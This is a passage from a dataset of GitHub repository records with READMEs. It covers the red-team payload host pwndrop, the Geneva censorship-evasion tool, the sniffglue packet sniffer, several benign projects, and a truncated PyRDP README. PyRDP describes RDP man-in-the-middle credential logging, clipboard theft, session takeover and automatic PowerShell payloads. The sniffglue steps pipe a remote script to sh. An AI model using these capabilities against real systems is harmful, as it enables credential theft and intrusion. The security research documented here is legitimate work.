**pwndrop** before the installation to automate the deployment of a tool even better.\\n\\nHere is an example config file with all available config variables with commentary:\\n```\\n[pwndrop]\\nlisten_ip = \\\"190.33.86.22\\\" # the external IP of your pwndrop instance (must be set if you want to use the nameserver feature)\\nhttp_port = 80 # listening port for HTTP and WebDAV\\nhttps_port = 443 # listening port for HTTPS\\ndata_dir = \\\"./data\\\" # directory path where data storage will reside (relative paths are from executable directory path)\\nadmin_dir = \\\"./admin\\\" # directory path where the admin panel files reside (relative paths are from executable directory path)\\n\\n[setup] # optional: put in if you want to pre-configure pwndrop (section will be deleted from the config file on first run)\\nusername = \\\"admin\\\" # username of the admin account\\npassword = \\\"secretpassword\\\" # password of the admin account\\nredirect_url = \\\"https://www.somedomain.com\\\" # URL to which visitors will be redirected to if they supply a path, which doesn't point to any shared file (put blank if you want to return 404)\\nsecret_path = \\\"/pwndrop\\\" # secret URL path, which upon visiting will allow your browser to access the login page of the admin panel (make sure to change the default value)\\n```\\n\\nIf you want to pre-configure your **pwndrop** instance before deployment using any of the installation scripts, put your configuration file at `/usr/local/pwndrop/pwndrop.ini` and it will be parsed the moment **pwndrop** daemon is first executed.\\n\\n## Credits\\n\\nHuge thanks to [**@jaredhaight**](https://twitter.com/jaredhaight) for inspiring me to learn Vue, with his [Faction C2](https://www.factionc2.com/) framework!\\n\\nAlso much thanks to all the people who gave me pre-release feedback and supported me with their opinions on the tool!\\n\\n## License\\n\\n**pwndrop** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)) and it's released under GPL3 license.\\n\"", "topics": ["redteam", "payloads", "file-manager", "self-hosted", "http-server", "webdav-server", "file-sharing"], "writeup": "", "ignoredescription": false, "id": 44, "full_name": "kgretzky/pwndrop", "url": "https://github.com/kgretzky/pwndrop", "topic_string": "redteam payloads file-manager self-hosted http-server webdav-server file-sharing"},
{"tags": [], "owner": "Kkevsterrr", "description": "automated censorship evasion for the client-side and server-side ", "name": "geneva", "topics_string": "", "language": "Python", "readme": "\"# Geneva [![Build Status](https://travis-ci.com/Kkevsterrr/geneva.svg?branch=master)](https://travis-ci.com/Kkevsterrr/geneva) [![codecov](https://codecov.io/gh/Kkevsterrr/geneva/branch/master/graph/badge.svg)](https://codecov.io/gh/Kkevsterrr/geneva) [![Documentation Status](https://readthedocs.org/projects/geneva/badge/?version=latest)](https://geneva.readthedocs.io/en/latest/?badge=latest)\\n\\nGeneva is an artificial intelligence tool that defeats censorship by exploiting bugs in censors, such as those in China, India, and Kazakhstan. Unlike many other anti-censorship solutions which require assistance from outside the censoring regime (Tor, VPNs, etc.), Geneva runs strictly on one side of the connection (either the client or server side).\\n\\nUnder the hood, Geneva uses a genetic algorithm to evolve censorship evasion strategies and has found several previously unknown bugs in censors. Geneva's strategies manipulate the network stream to confuse the censor without impacting the client/server communication. This makes Geneva effective against many types of in-network censorship (though it cannot be used against IP-blocking censorship). \\n\\nGeneva is composed of two high level components: its genetic algorithm (which it uses to evolve new censorship evasion strategies) and its strategy engine (which is uses to run an individual censorship evasion strategy over a network connection). \\n\\nThis codebase contains the Geneva's full implementation: its genetic algorithm, strategy engine, Python API, and a subset of published strategies. With these tools, users and researchers alike can evolve new strategies or leverage existing strategies to evade censorship. To learn more about how Geneva works, see [How it Works](#How-it-Works) or checkout our [documentation](https://geneva.readthedocs.io). \\n\\n## Setup\\n\\nGeneva has been developed and tested for Centos or Debian-based systems. Due to limitations of\\nnetfilter and raw sockets, Geneva does not work on OS X or Windows at this time and requires *python3.6*.\\nMore detailed setup instructions are available at our [documentation](https://geneva.readthedocs.io).\\n\\nInstall netfilterqueue dependencies:\\n```\\n# sudo apt-get install build-essential python-dev libnetfilter-queue-dev libffi-dev libssl-dev iptables python3-pip\\n```\\n\\nInstall Python dependencies:\\n```\\n# python3 -m pip install -r requirements.txt\\n```\\n\\n## Running a Strategy\\n\\nA censorship evasion strategy is simply a _description of how network traffic should be modified_. A strategy is not\\ncode, it is a description that tells the engine how it should operate over traffic. For a fuller description of the DNA syntax, see [Censorship Evasion Strategies](#Censorship-Evasion-Strategies).\\n\\n```\\n# python3 engine.py --server-port 80 --strategy \\\"[TCP:flags:PA]-duplicate(tamper{TCP:dataofs:replace:10}(tamper{TCP:chksum:corrupt},),)-|\\\" --log debug\\n2019-10-14 16:34:45 DEBUG:[ENGINE] Engine created with strategy \\\\/ (ID bm3kdw3r) to port 80\\n2019-10-14 16:34:45 DEBUG:[ENGINE] Configuring iptables rules\\n2019-10-14 16:34:45 DEBUG:[ENGINE] iptables -A OUTPUT -p tcp --sport 80 -j NFQUEUE --queue-num 1\\n2019-10-14 16:34:45 DEBUG:[ENGINE] iptables -A INPUT -p tcp --dport 80 -j NFQUEUE --queue-num 2\\n2019-10-14 16:34:45 DEBUG:[ENGINE] iptables -A OUTPUT -p udp --sport 80 -j NFQUEUE --queue-num 1\\n2019-10-14 16:34:45 DEBUG:[ENGINE] iptables -A INPUT -p udp --dport 80 -j NFQUEUE --queue-num 2\\n```\\n\\nNote that if you have stale `iptables` rules or other rules that rely on Geneva's default queues,\\nthis will fail. To fix this, remove those rules. \\n\\n## Strategy Library\\n\\nGeneva has found dozens of strategies that work against censors in China, Kazakhstan, India, and Iran. We include several of these strategies in [strategies.md](strategies.md). Note that this file contains success rates for each individual country; a strategy that works in one country may not work as well as other countries.\\n\\nResearchers have observed that strategies may have differing success rates based on your exact location. Although we have not observed this from our vantage points, you may find that some strategies may work differently in a country we have tested. If this is the case, don't be alarmed. However, please feel free to reach out to a member of the team directly or open an issue on this page so we can track how the strategies work from other geographic locations.\\n\\n## Disclaimer\\n\\nRunning these strategies may place you at risk if you use it within a censoring regime. Geneva takes overt actions that interfere with the normal operations of a censor and its strategies are detectable on the network. During the training process, Geneva will intentionally trip censorship many times. Geneva is not an anonymity tool, nor does it encrypt any traffic. Understand the risks of running Geneva in your country before trying it.\\n\\n-------\\n\\n# How it Works\\n\\nSee our [paper](#Paper) for an in-depth read on how Geneva works. Below is a walkthrough of the main concepts behind Geneva, the major components of the codebase, and how they can be used. \\n\\n## Censorship Evasion Strategies\\n\\nA censorship evasion strategy is simply a _description of how network traffic should be modified_. A strategy is _not\\ncode_, it is a description that tells Geneva's stratgy engine how it should manipulate network traffic. The goal of a censorship evasion strategy is to modify the network traffic in a such a way that the censor is unable to censor it, but the client/server communication is unimpacted. \\n\\nA censorship evasion strategy composed of one or more packet-level building blocks. Geneva's core building blocks are:\\n1. `duplicate`: takes one packet and returns two copies of the packet\\n2. `drop`: takes one packet and returns no packets (drops the packet)\\n3. `tamper`: takes one packet and returns the modified packet\\n4. `fragment`: takes one packet and returns two fragments or two segments\\n\\nSince `duplicate` and `fragment` introduce _branching_, these actions are composed into a binary-tree structure called an _action tree_. Each tree also has a _trigger_. The trigger describes which packets the tree should run on, and the tree describes what should happen to each of those packets when the trigger fires. Once a trigger fires on a packet, it pulls the packet into the tree for modifications, and the packets that emerge from the tree are sent on the wire. Recall that Geneva operates at the packet level, therefore all triggers are packet-level triggers. \\n\\nMultiple action trees together form a _forest_. Geneva handles outbound and inbound packets differently, so strategies are composed of two forests: an outbound forest and an inbound forest.\\n\\nConsider the following example of a simple Geneva strategy. \\n``` \\n +---------------+\\n | TCP:flags:A | <-- triggers on TCP packets with the flags field set to 'ACK'\\n +-------+-------+ matching packets are captured and pulled into the tree\\n |\\n +---------v---------+\\n duplicate <-- makes two copies of the given packet. the tree is processed \\n +---------+---------+ with an inorder traversal, so the left side is run first\\n |\\n +-------------+------------+\\n | |\\n+------------v----------+ v <-- dupilcate has no right child, so this packet will be sent on the wire unimpacted\\n tamper \\n {TCP:flags:replace:R} <-- parameters to this action describe how the packet should be tampered \\n+------------+----------+\\n |\\n+------------v----------+\\n tamper\\n {TCP:chksum:corrupt}\\n+------------+----------+\\n |\\n v <-- packets that emerge from an in-order traversal of the leaves are sent on the wire\\n\\n```\\n\\nThis strategy triggers on `TCP` packets with the `flags` field set to `ACK`. It makes a duplicate of the `ACK` packet; the first duplicate has its flags field changed to `RST` and its checksum (`chksum`) field corrupted; the second duplicate is unchaged. Both packets are then sent on the network. \\n\\n### Strategy DNA\\n\\nThese strategies can be arbitrarily complicated, and Geneva defines a well-formatted string syntax for\\nunambiguously expressing strategies.\\n\\nA strategy divides how it handles outbound and inbound packets: these are separated in the DNA by a \\n\\\"\\\\\\\\/\\\". Specifically, the strategy format is `<outbound forest> \\\\/ <inbound forest>`. If `\\\\/` is not\\npresent in a strategy, all of the action trees are in the outbound forest. \\n\\nBoth forests are composed of action trees, and each forest is allowed an arbitrarily many trees. \\n\\nAction trees always start with a trigger, which is formatted as: `[<protocol>:<field>:<value>]`. For example, the trigger: `[TCP:flags:S]` will run its corresponding tree whenever it sees a `TCP` packet with the `flags` field set to `SYN`. If the corresponding action tree is `[TCP:flags:S]-drop-|`, this action tree will cause the engine to drop any `SYN` packets. `[TCP:flags:S]-duplicate-|` will cause the engine to duplicate any SYN packets. \\n\\nSyntactically, action trees end with `-|`.\\n\\nDepending on the type of action, some actions can have up to two children (such as `duplicate`). These are represented\\nwith the following syntax: `[TCP:flags:S]-duplicate(<left_child>,<right_child>)-|`, where\\n`<left_child>` and `<right_child>` themselves are trees. If `(,)` is not specified, any packets\\nthat emerge from the action will be sent on the wire. If an action only has one child (such as `tamper`), it is always the left child. `[TCP:flags:S]-tamper{<parameters>}(<left_child>,)-|`\\n\\nActions that have parameters specify those parameters within `{}`. For example, giving parameters to the `tamper` action could look like: `[TCP:flags:S]-tamper{TCP:flags:replace:A}-|`. This strategy would trigger on TCP `SYN` packets and replace the TCP `flags` field to `ACK`. \\n\\nPutting this all together, below is the strategy DNA representation of the above diagram:\\n```\\n[TCP:flags:A]-duplicate(tamper{TCP:flags:replace:R}(tamper{TCP:chksum:corrupt},),)-| \\\\/\\n```\\n\\nGeneva has code to parse this strategy DNA into strategies that can be applied to network traffic using the engine. \\n\\nNote that due to limitations of Scapy and NFQueue, actions that introduce branching (`fragment`, `duplicate`) are\\ndisabled for incoming action forests. \\n\\n## Engine\\n\\nThe strategy engine (`engine.py`) applies a strategy to a network connection. The engine works by capturing all traffic to/from a specified port. Packets that match an active trigger are run through the associated action-tree, and packets that emerge from the tree are sent on the wire. \\n\\nThe engine also has a Python API for using it in your application. It can be used as a context manager or invoked in the background as a thread. \\nFor example, consider the following simple application. \\n\\n```python\\nimport os\\nimport engine\\n\\n# Port to run the engine on\\nport = 80\\n# Strategy to use\\nstrategy = \\\"[TCP:flags:A]-duplicate(tamper{TCP:flags:replace:R}(tamper{TCP:chksum:corrupt},),)-| \\\\/\\\"\\n\\n# Create the engine in debug mode\\nwith engine.Engine(port, strategy, log_level=\\\"debug\\\") as eng:\\n os.system(\\\"curl http://example.com?q=ultrasurf\\\")\\n```\\nThis script creates an instance of the engine with a specified strategy, and that strategy will be running for everything within the context manager. When the context manager exits, the engine will clean itself up. See the `examples/` folder for more use cases of the engine. \\n\\nDue to limitations of scapy and NFQueue, the engine cannot be used to communicate with localhost.\\n\\n## Citation\\n\\nIf you like the work or plan to use it in your projects, please follow the guidelines in [citation.bib](https://github.com/Kkevsterrr/geneva/blob/master/citation.bib).\\n\\n## Paper\\n\\nSee [our paper](http://geneva.cs.umd.edu/papers/geneva_ccs19.pdf) from CCS or the rest of [our papers and talks](http://geneva.cs.umd.edu/papers/) for an in-depth dive into how Geneva works and how it can be applied.\\n\\n## Contributors\\n\\n[Kevin Bock](https://github.com/Kkevsterrr)\\n\\n[George Hughey](https://github.com/ecthros)\\n\\n[Xiao Qiang](https://twitter.com/rockngo)\\n\\n[Dave Levin](https://www.cs.umd.edu/~dml/)\\n\"", "topics": ["censorship-resistance", "censorship-circumvention", "networking"], "writeup": "Geneva is an artificial intelligence tool that defeats censorship by exploiting bugs in censors, such as those in China, India, and Kazakhstan. Unlike many other anti-censorship solutions which require assistance from outside the censoring regime (Tor, VPNs, etc.), Geneva runs strictly on one side of the connection (either the client or server side).\nUnder the hood, Geneva uses a genetic algorithm to evolve censorship evasion strategies and has found several previously unknown bugs in censors. Geneva's strategies manipulate the network stream to confuse the censor without impacting the client/server communication. This makes Geneva effective against many types of in-network censorship (though it cannot be used against IP-blocking censorship).\n", "ignoredescription": false, "id": 45, "full_name": "Kkevsterrr/geneva", "url": "https://github.com/Kkevsterrr/geneva", "topic_string": "censorship-resistance censorship-circumvention networking"},
{"tags": [], "owner": "kpcyrd", "description": "Secure multithreaded packet sniffer", "name": "sniffglue", "topics_string": "", "language": "Rust", "readme": "\"# sniffglue [![Build Status][travis-img]][travis] [![Crates.io][crates-img]][crates]\\n\\n[travis-img]: https://travis-ci.org/kpcyrd/sniffglue.svg?branch=master\\n[travis]: https://travis-ci.org/kpcyrd/sniffglue\\n[crates-img]: https://img.shields.io/crates/v/sniffglue.svg\\n[crates]: https://crates.io/crates/sniffglue\\n\\nsniffglue is a network sniffer written in rust. Network packets are parsed concurrently\\nusing a thread pool to utilize all cpu cores. Project goals are that you can\\nrun sniffglue securely on untrusted networks and that it must not crash\\nwhen processing packets. The output should be as useful as possible by default.\\n\\n![screenshot](docs/screenshot.png)\\n\\n## Usage\\n\\n # sniff with default filters (dhcp, dns, tls, http)\\n sniffglue enp0s25\\n # increase the filter sensitivity (arp)\\n sniffglue -v enp0s25\\n # increase the filter sensitivity (cjdns, ssdp, dropbox, packets with valid utf8)\\n sniffglue -vv enp0s25\\n # almost everything\\n sniffglue -vvv enp0s25\\n # everything\\n sniffglue -vvvv enp0s25\\n\\n## Installation\\n\\n### Arch Linux\\n\\n pacman -S sniffglue\\n\\n### Mac OSX\\n\\n brew install sniffglue\\n\\n### Debian/Ubuntu/Kali\\n\\nThere are prebuilt packages signed by a debian maintainer. We can import the\\nkey for this repository out of the debian keyring.\\n\\n apt install debian-keyring\\n gpg -a --export --keyring /usr/share/keyrings/debian-maintainers.gpg git@rxv.cc | apt-key add -\\n apt-key adv --keyserver keyserver.ubuntu.com --refresh-keys git@rxv.cc\\n echo deb http://apt.vulns.sexy stable main > /etc/apt/sources.list.d/apt-vulns-sexy.list\\n apt update\\n apt install sniffglue\\n\\n### Alpine\\n\\n apk add sniffglue\\n\\n### Gentoo\\n\\n layman -a pentoo\\n emerge --ask net-analyzer/sniffglue\\n\\n### NixOS\\n\\n nix-env -i sniffglue\\n\\n### From source\\n\\nTo build from source make sure you have libpcap and libseccomp installed. On\\ndebian based systems:\\n\\n # install the dependencies\\n sudo apt install libpcap-dev libseccomp-dev\\n # install rust with rustup\\n curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\\n source $HOME/.cargo/env\\n # install sniffglue and test it\\n cargo install sniffglue\\n sniffglue --help\\n\\nOr you can build a Debian package via [cargo-deb](https://github.com/mmstick/cargo-deb):\\n\\n cargo deb\\n\\n## Protocols\\n\\n- [X] ethernet\\n- [X] ipv4\\n- [X] ipv6\\n- [X] arp\\n- [X] tcp\\n- [X] udp\\n- [ ] icmp\\n- [X] http\\n- [X] tls\\n- [X] dns\\n- [X] dhcp\\n- [X] cjdns eth beacons\\n- [X] ssdp\\n- [X] dropbox beacons\\n- [ ] 802.11\\n\\n## Docker\\n\\nYou can build sniffglue as a docker image to debug container setups. The image\\nis currently about 11.1MB. It is recommended to push it to your own registry.\\n\\n docker build -t sniffglue .\\n docker run -it --init --rm --net=host sniffglue eth0\\n\\n## Security\\n\\nTo report a security issue please contact kpcyrd on ircs://irc.hackint.org.\\n\\n### Seccomp\\n\\nTo ensure a compromised process doesn't compromise the system, sniffglue uses\\nseccomp to restrict the syscalls that can be used after the process started.\\nThis is done in two stages, first at the very beginning (directly after\\nenv\\\\_logger initialized) and once after the sniffer has been setup, but before\\npackets are read from the network.\\n\\n### Hardening\\n\\nDuring the second stage, there's also some general hardening that is applied\\nbefore all unneeded syscalls are finally disabled. Those are system specific,\\nso a configuration file is read from `/etc/sniffglue.conf`. This config\\nfile specifies an empty directory for `chroot` and an unprivileged account\\nin `user` that is used to drop root privileges.\\n\\n### boxxy-rs\\n\\nThis project includes a small [boxxy-rs] based shell that can be used to\\nexplore the sandbox at various stages during and after initialization. This is\\nalso used by travis to ensure the sandbox actually blocks syscalls.\\n\\n cargo run --example boxxy\\n\\n[boxxy-rs]: https://github.com/kpcyrd/boxxy-rs\\n\\n### Reproducible builds\\n\\nThis project is tested using reprotest. Currently the following variations are\\nexcluded:\\n\\n- `-time` - needed because the crates.io cert expires in the future\\n- `-domain_host` - requires root for unshare(2) and has been excluded\\n\\nDon't forget to install the build dependencies.\\n\\n ci/reprotest.sh\\n\\n### Fuzzing\\n\\nThe packet processing of sniffglue can be fuzzed using [cargo-fuzz].\\nEverything you should need is provided in the `fuzz/` directory that is\\ndistributed along with its source code. Please note that this program links\\nto libpcap which is not included in the current fuzzing configuration.\\n\\n cargo fuzz run read_packet\\n\\n[cargo-fuzz]: https://github.com/rust-fuzz/cargo-fuzz\\n\\n## License\\n\\nGPLv3+\\n\"", "topics": ["sniffer", "sandboxed", "network", "pcap"], "writeup": "sniffglue is a network sniffer written in rust. Network packets are parsed concurrently using a thread pool to utilize all cpu cores. Project goals are that you can run sniffglue securely on untrusted networks and that it must not crash when processing packets. The output should be as useful as possible by default.", "ignoredescription": false, "id": 46, "full_name": "kpcyrd/sniffglue", "url": "https://github.com/kpcyrd/sniffglue", "topic_string": "sniffer sandboxed network pcap"},
{"tags": [], "owner": "kscottz", "description": "Python Examples for Remote Sensing", "name": "PythonFromSpace", "topics_string": "", "language": "Jupyter Notebook", "readme": "\"## Python from Space: Analyzing Open Satellite Imagery Using the Python Ecosystem\\n\\nThis repository contains the slides and Jupyter notebooks for Kat's [\\\"Python from Space\\\"](https://us.pycon.org/2017/schedule/presentation/364/) talk at Pycon 2017 in Portland, Oregon.\\n\\n### Abstract\\nEarth imaging satellites, just like our computers, are shrinking and becoming more ubiquitous than ever before. It is now possible to obtain open satellite data on a daily if not weekly basis and for this data to be put to work; helping us better understand our planet and quickly respond to disaster situations.\\n\\nIn this talk, we will work through Jupyter notebooks that cover the satellite data ecosystem and the python tools that can be used to sift through and analyze that data. Topics include python tools for using Open Street Maps data, the Geospatial Data Abstraction Library (GDAL), and OpenCV and NumPy for image processing. This talk is intended for novice and intermediate python developers who are interested in using data science and satellite imagery for social good and fundamental scientific research.\\n\\n### Contents\\n* [Slides](Pycon2017.pdf) (pdf for download): An overview of satellites and satellite terminology, the basics of remote sensing, sources of free satellite imagery, and tools for processing and analyzing images.\\n* [Requirements](requirements.txt): A list of Python libraries you'll need for this project.\\n* [The Basics](TheBasics.ipynb): Setting up your development environment; making a slippy map and defining an area of interest on the map; searching, filtering, and downloading satellite imagery that intersects with the area of interest.\\n* [Data](data-sources.md): Links to sources of public and private satellite imagery\\n* [Open Street Map Example](OpenStreetMapsExample.ipynb): Querying Open Street Map for all the parks in Portland; finding and downloading satellite imagery of those parks; analyzing how green each park os and visualizing daily changes in each park \\\"greenness\\\" on a slippy map.\\n* [Making Movies](MovieTime.ipynb): Wayfinding from park to park; creating a masterpiece movie of your \\\"Great Portland Park Tour of 2017.\\\"\\n\\n### About the imagery used in these notebooks\\nThe Planet imagery used in these notebooks covers areas of interest in Portland, Oregon. Why? Pycon was in Portland this year and local examples are cool! If you decide to sign up for a [Planet Explorer account (and API key)](https://www.planet.com/explorer/), you should know that the free account gives you access to **a lot** of data-- just not data in Oregon. Instead you'll get access to several years' worth of imagery for the entire state of California under a CC BY-SA 4.0 license. It's part of Planet's [Open California program](https://support.planet.com/hc/en-us/articles/212993777-What-is-included-in-Open-California-).\\n\"", "topics": ["gis", "jupyter-notebook", "imaging", "image-processing", "python", "vision", "computer-vision", "satellite"], "writeup": "", "ignoredescription": false, "id": 47, "full_name": "kscottz/PythonFromSpace", "url": "https://github.com/kscottz/PythonFromSpace", "topic_string": "gis jupyter-notebook imaging image-processing python vision computer-vision satellite"},
{"tags": [], "owner": "leighghunt", "description": "A tool to visualise geofences and realtime events in Tile38 on a map", "name": "tile38-viewer", "topics_string": "", "language": "JavaScript", "readme": "\"# tile38-viewer\\nA tool to visualise the state of events in Tile38\\n\\nZero configuration* - queries all geofence [channels](https://tile38.com/commands/setchan/) and [keys](https://tile38.com/commands/keys/) in your [Tile38](https://github.com/tidwall/tile38) instance.\\n\\nShows current state of items within tile38:\\n![Clip1](img/clip1.gif)\\n\\nHighlights simple enter/exit/cross geofence events:\\n![Clip2](img/clip2.gif)\\n\\n*May require some configuration.\\n\\n# Quickstart - on server\\n```\\nwget https://raw.githubusercontent.com/leighghunt/tile38-viewer/master/docker-compose.yml\\nwget https://raw.githubusercontent.com/leighghunt/tile38-viewer/master/docker-environment-list\\nsudo docker-compose up -d\\n```\\n* Ensure that ports 80, 443 and 9851 are open to traffic.\\n\\n## On local machine using [tile38-cli](https://tile38.com/topics/command-line-interface/):\\n```\\n$ tile38-cli -h <host>\\n<host>:9851> chans *\\n{\\\"ok\\\":true,\\\"chans\\\":[],\\\"elapsed\\\":\\\"4.63\\u00b5s\\\"}\\n<host>:9851>\\n```\\n\\n\\n## Updating geofences in Tile38\\n```\\nSETCHAN buildingTiakiwai WITHIN traffic FENCE DETECT enter,exit,cross OBJECT {\\\"type\\\":\\\"Polygon\\\",\\\"coordinates\\\":[[[174.77801,-41.27632],[174.77800,-41.27686],[174.77881,-41.27688],[174.77883,-41.27634],[174.77801,-41.27632]]]}\\n\\nSETCHAN buildingRutherfordHouse WITHIN traffic FENCE DETECT enter,exit,cross OBJECT {\\\"type\\\":\\\"Polygon\\\",\\\"coordinates\\\":[[[174.77861,-41.27881],[174.77893,-41.27917],[174.77895,-41.27916],[174.77900,-41.27919],[174.77921,-41.27907],[174.77920,-41.27906],[174.77927,-41.27902],[174.77922,-41.27898],[174.77925,-41.27895],[174.77921,-41.27889],[174.77924,-41.27886],[174.77926,-41.27888],[174.77943,-41.27870],[174.77949,-41.27873],[174.77959,-41.27863],[174.77926,-41.27847],[174.77861,-41.27881]]]}\\n```\\n\\n\\n## Updating points in Tile38\\n```\\nSET traffic Alice POINT -41.2763 174.7779\\nSET traffic Alice POINT -41.2763 174.7781\\nSET traffic Alice POINT -41.2763 174.7783\\nSET traffic Alice POINT -41.2764 174.7783\\n\\nSET traffic Bob POINT -41.279823 174.779713\\nSET traffic Bob POINT -41.279575 174.779228\\nSET traffic Bob POINT -41.279269 174.778916\\nSET traffic Bob POINT -41.279091 174.778754\\nSET traffic Bob POINT -41.278963 174.778845\\nSET traffic Bob POINT -41.278867 174.778982\\nSET traffic Bob POINT -41.278763 174.778914\\nSET traffic Bob POINT -41.278634 174.778848\\n```\\n\\n![TestResult](img/testResult.png)\\n\\n\\n\\n# Walkthrough start on Ubuntu Server 18.04 LTS (HVM)\\nhttps://docs.docker.com/install/linux/docker-ce/ubuntu/\\n```\\n$ sudo apt-get update\\n\\n$ sudo apt-get install \\\\\\n apt-transport-https \\\\\\n ca-certificates \\\\\\n curl \\\\\\n gnupg-agent \\\\\\n software-properties-common\\n\\n$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -\\n\\n$ sudo apt-key fingerprint 0EBFCD88\\n\\npub rsa4096 2017-02-22 [SCEA]\\n 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88\\nuid [ unknown] Docker Release (CE deb) <docker@docker.com>\\nsub rsa4096 2017-02-22 [S]\\n\\n$ sudo add-apt-repository \\\\\\n \\\"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\\\\\n $(lsb_release -cs) \\\\\\n stable\\\"\\n\\n$ sudo apt-get update\\n\\n$ sudo apt-get install docker-ce docker-ce-cli containerd.io\\n\\n$ sudo docker run hello-world\\n\\n$ sudo curl -L \\\"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-$(uname -s)-$(uname -m)\\\" -o /usr/local/bin/docker-compose\\n\\n$ sudo chmod +x /usr/local/bin/docker-compose\\n\\n$ docker-compose --version\\ndocker-compose version 1.24.1, build 4667896b\\n\\n$ wget https://raw.githubusercontent.com/leighghunt/tile38-viewer/master/docker-compose.yml\\n$ wget https://raw.githubusercontent.com/leighghunt/tile38-viewer/master/docker-environment-list\\n$ sudo docker-compose up -d\\n```\\n\"", "topics": ["visualization", "geojson", "leaflet", "gis", "tile38", "geo", "map", "spatial", "leafletjs", "viewer", "geospatial", "geofence"], "writeup": "", "ignoredescription": false, "id": 48, "full_name": "leighghunt/tile38-viewer", "url": "https://github.com/leighghunt/tile38-viewer", "topic_string": "visualization geojson leaflet gis tile38 geo map spatial leafletjs viewer geospatial geofence"},
{"tags": [], "owner": "leonjza", "description": "Frida Boot \ud83d\udc62- A binary instrumentation workshop, with Frida, for beginners!", "name": "frida-boot", "topics_string": "", "language": "CSS", "readme": "\"\\n<h1 align=\\\"center\\\">\\n <br>\\n <br>\\n frida-boot \\ud83d\\udc62\\n <br>\\n</h1>\\n\\n<h4 align=\\\"center\\\">\\n A binary instrumentation workshop, using <a href=\\\"https://frida.re\\\" target=\\\"_blank\\\">Frida</a>, for beginners!\\n <br />\\n <p align=\\\"center\\\">\\n <a href=\\\"https://twitter.com/leonjza\\\"><img src=\\\"https://img.shields.io/badge/twitter-%40leonjza-blue.svg\\\" alt=\\\"@leonjza\\\" height=\\\"18\\\"></a>\\n <a href=\\\"https://hub.docker.com/r/leonjza/frida-boot\\\"><img alt=\\\"Docker Cloud Build Status\\\" src=\\\"https://img.shields.io/docker/cloud/build/leonjza/frida-boot\\\"></a>\\n </p>\\n </h4>\\n\\n## quickstart\\n\\n<img align=\\\"right\\\" src=\\\"./images/frida-boot-web.png\\\" height=\\\"320\\\" alt=\\\"frida-boot\\\">\\n\\n- `git clone https://github.com/leonjza/frida-boot`\\n- `cd frida-boot`\\n- `./docker.sh pull`\\n- `./docker.sh run`\\n\\nAfter running the container, all of the offline workshop content will be available at <http://localhost:9999>.\\n\\n## slides & stream\\n\\nThis workshop was streamed on YouTube [here](https://www.youtube.com/watch?v=CLpW1tZCblo).\\n\\nThe slides for the workshop can be found on Google Slides [here](https://docs.google.com/presentation/d/1BK4CsGChSKI8BCVsg9Rlv0lY5AfsrbanhIRWnKaP0TI/edit?usp=sharing), with a PDF copy available in the `slides/` directory of this repository.\\n\\n## manually building\\n\\nThe `Dockerfile` in this repository can be used to manually build the container. Feel free to edit it to suit your needs.\\n\\n```bash\\ndocker build -t frida-boot:local .\\n```\\n\"", "topics": ["frida", "education", "instrumentation", "training", "beginner", "workshop", "course"], "writeup": "", "ignoredescription": false, "id": 49, "full_name": "leonjza/frida-boot", "url": "https://github.com/leonjza/frida-boot", "topic_string": "frida education instrumentation training beginner workshop course"},
{"tags": [], "owner": "lifa123", "description": "RDP man-in-the-middle (mitm) and library for Python 3 with the ability to watch connections live or after the fact", "name": "pyrdp", "topics_string": "", "language": "", "readme": "\"# PyRDP\\nPyRDP is a Python 3 Remote Desktop Protocol (RDP) Man-in-the-Middle (MITM) and library.\\n\\n![PyRDP Logo](https://raw.githubusercontent.com/GoSecure/pyrdp/master/docs/pyrdp-logo.svg?sanitize=true)\\n\\nIt features a few tools:\\n- RDP Man-in-the-Middle\\n - Logs credentials used when connecting\\n - Steals data copied to the clipboard\\n - Saves a copy of the files transferred over the network\\n - Crawls shared drives in the background and saves them locally\\n - Saves replays of connections so you can look at them later\\n - Runs console commands or PowerShell payloads automatically on new connections\\n- RDP Player:\\n - See live RDP connections coming from the MITM\\n - View replays of RDP connections\\n - Take control of active RDP sessions while hiding your actions\\n - List the client's mapped drives and download files from them during active sessions\\n- RDP Certificate Cloner:\\n - Create a self-signed X509 certificate with the same fields as an RDP server's certificate\\n\\nWe have used this tool as part of an RDP honeypot which records sessions and saves a copy of the malware dropped on our\\ntarget machine.\\n\\nPyRDP was [first introduced in a blogpost](https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera) in which we [demonstrated that we can catch a real threat actor in action](https://www.youtube.com/watch?v=eB7RC9FmL6Q). In May 2019 a [presentation by its authors](https://docs.google.com/presentation/d/1avcn8Sh2b3IE7AA0G9l7Cj5F1pxqizUm98IbXUo2cvY/edit#slide=id.g404b70030f_0_581) was given at NorthSec and two demos were performed. [The first one covered](https://youtu.be/5JztJzi-m48) credential logging, clipboard stealing, client-side file browsing and a session take-over. [The second one covered](https://youtu.be/bU67tj1RkMA) the execution of cmd or powershell payloads when a client successfully authenticates.\\nIn August 2019, PyRDP was demo'ed at BlackHat Arsenal ([slides](https://docs.google.com/presentation/d/17P_l2n-hgCehQ5eTWilru4IXXHnGIRTj4ftoW4BiX5A/edit?usp=sharing)).\\n\\n## Table of Contents\\n- [Supported Systems](#supported-systems)\\n- [Installing](#installing)\\n * [Using the Docker Image](#using-the-docker-image)\\n * [From Git Source](#from-git-source)\\n * [Installing on Windows](#installing-on-windows)\\n * [Building the Docker Image](#building-the-docker-image)\\n * [Migrating away from pycrypto](#migrating-away-from-pycrypto)\\n- [Using PyRDP](#using-pyrdp)\\n * [Using the PyRDP Man-in-the-Middle](#using-the-pyrdp-man-in-the-middle)\\n + [Specifying the private key and certificate](#specifying-the-private-key-and-certificate)\\n + [Connecting to the PyRDP player](#connecting-to-the-pyrdp-player)\\n - [Connecting to a PyRDP player when the MITM is running on a server](#connecting-to-a-pyrdp-player-when-the-mitm-is-running-on-a-server)\\n + [Running payloads on new connections](#running-payloads-on-new-connections)\\n - [Setting the payload](#setting-the-payload)\\n - [Choosing when to start the payload](#choosing-when-to-start-the-payload)\\n - [Choosing when to resume normal activity](#choosing-when-to-resume-normal-activity)\\n + [Other MITM arguments](#other-mitm-arguments)\\n * [Using the PyRDP Player](#using-the-pyrdp-player)\\n + [Playing a replay file](#playing-a-replay-file)\\n + [Listening for live connections](#listening-for-live-connections)\\n + [Changing the 